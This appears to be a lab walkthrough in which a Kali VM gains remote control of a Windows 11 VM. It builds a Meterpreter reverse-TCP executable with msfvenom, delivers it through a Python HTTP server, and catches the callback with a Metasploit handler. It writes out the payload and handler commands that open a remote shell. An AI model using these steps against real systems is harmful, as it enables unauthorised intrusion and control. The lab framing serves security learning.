# Windows 11 Meterpreter Payload Demonstration

### Objective:

Demonstrate the process of creating, delivering, and executing a malicious payload to establish remote access/control to a Windows 11 machine.

### Test Environment:

The simulated test environment consists of two virtual machines:
* **Kali Linux VM:** Acts as the attacker machine.
* **Windows 11 VM:** Serves as the target machine.

### Tools:

* **VMware**
* **Kali Linux**
* **Metasploit**


## Steps

### 1. Obtain host IP address

```
ifconfig
```

### 2. Payload Creation with MSFvenom

MSFvenom is a component of the Metasploit framework used to create payloads for the exploitation of target devices.

The payload created will execute as an `.exe` file named “plague”. The `plague.exe` file is configured with the Kali Linux machine’s IP (LHOST) and listening port (LPORT). When executed in the target machine, the file will connect to our Kali Linux machine to establish a bridge between our target and attacking machine.

**Payload Creation Command:**
``` 
msfvenom -p windows/x64/meterpreter\_reverse\_tcp \\

LHOST=<IP-ADDRESS> \\

LPORT=1122 \\

\-f exe \\

\-o plague
```
*Replace `<IP-ADDRESS>` with the actual IP address obtained in Step 1.*

![image](https://github.com/user-attachments/assets/4c3ef797-f4cf-47bb-89f7-51250ae8a0fa)


### 3. Create Python Webserver for Payload Delivery

To transfer the malicious plague.exe file to our target, I will utilize a python server created on my local subnet. Real world scenarios would involve social engineering, cross-site scripting (XSS), phishing, etc.

**Initiate the Python 3 HTTP Server on Port 8080:**
```
python3 -m http.server 8080
```
![image](https://github.com/user-attachments/assets/af23b722-f206-4dfe-90cc-3f8428ead2a1)


### 4. Configuring Metasploit Handler

When our payload is deployed, our Kali Linux machine will need to be ready to accept the incoming connection from our payload. To receive the incoming connection, we will configure a Metasploit handler.

**Launch Metasploit:**
```
sudo msfconsole
```

**Initiate Handler:**

The handler will listen for incoming connections from the payload.

```
use exploit/multi/handler
```
![image](https://github.com/user-attachments/assets/60836d48-9869-4cfa-9966-95d700cf34c5)


### 5. Define Expected Payload

The handler is configured to the correct specifications of our payload and target machine. Our target machine is a Windows 11 machine running on 64-bit OS with payload communication from a meterpreter\_reverse\_tcp payload

**Set Handler Specifications:**

```
set payload windows/x64/meterpreter\_reverse\_tcp

options
```

![image](https://github.com/user-attachments/assets/13e72301-ba0d-4937-a615-5d452c8bd670)


Executing the options command will display the parameters for the handler. To ensure proper connection, we will need to configure the parameters to our plague.exe payload.

**Set the Listening Host and Port:**

```
set LHOST <ip-address>

set LPORT 1122
```
*Replace `<IP-ADDRESS>` with the actual IP address obtained in Step 1.*

### 6. Execute Exploit

```
exploit
```
![image](https://github.com/user-attachments/assets/032345ea-98a9-4b3b-8734-45d351c059a9)


### 7. Payload Delivery and Execution

From the Windows 11 target machine, we must navigate to our Python 3 HTTP server.

**Input Address to HTTP Server:**

```
<ip-address>:8080
```
![image](https://github.com/user-attachments/assets/54a2a28a-f0fa-4b92-9d2e-7a1b90a98a9e)


*Replace `<IP-ADDRESS>` with the actual IP address obtained in Step 1.*

Click `plague.exe` to download the payload onto the target system and run the payload.

![image](https://github.com/user-attachments/assets/aeb0ce4e-ee43-4818-8738-6c5b8b2cd6a7)

### 8. Session Confirmation and Control

Upon successful execution of the `plague.exe` payload on the Windows 11 target, a **Meterpreter session** is established on the attacking Kali Linux machine. Control has now been established - granting command-line interface (CLI) and system access to the target machine.
![image](https://github.com/user-attachments/assets/170f1f21-fe83-4cd5-8ce9-df2538fc87e1)




